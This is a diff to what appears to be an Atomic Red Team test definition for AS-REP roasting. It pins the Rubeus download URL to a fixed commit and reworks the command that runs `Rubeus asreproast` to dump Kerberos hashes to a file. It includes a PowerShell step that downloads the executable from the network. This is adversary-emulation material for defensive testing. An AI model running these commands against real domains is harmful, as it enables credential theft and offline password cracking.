@@ -23,7 +23,7 @@ atomic_tests:
     rubeus_url:
       description: URL of Rubeus executable
       type: url
-      default: https://github.com/morgansec/Rubeus/raw/art-test/Rubeus/bin/Debug/Rubeus45.exe
+      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -40,10 +40,9 @@ atomic_tests:
       Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
   executor:
     command: |
-      "#{local_folder}\#{local_executable}" + " asreproast " + "/outfile:#{local_folder}\#{out_file}"
+      cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
     cleanup_command: |
-      Remove-Item #{local_folder}\#{local_executable} -ErrorAction Ignore
       Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
     name: powershell
-    elevation_required: true
+    elevation_required: false
   
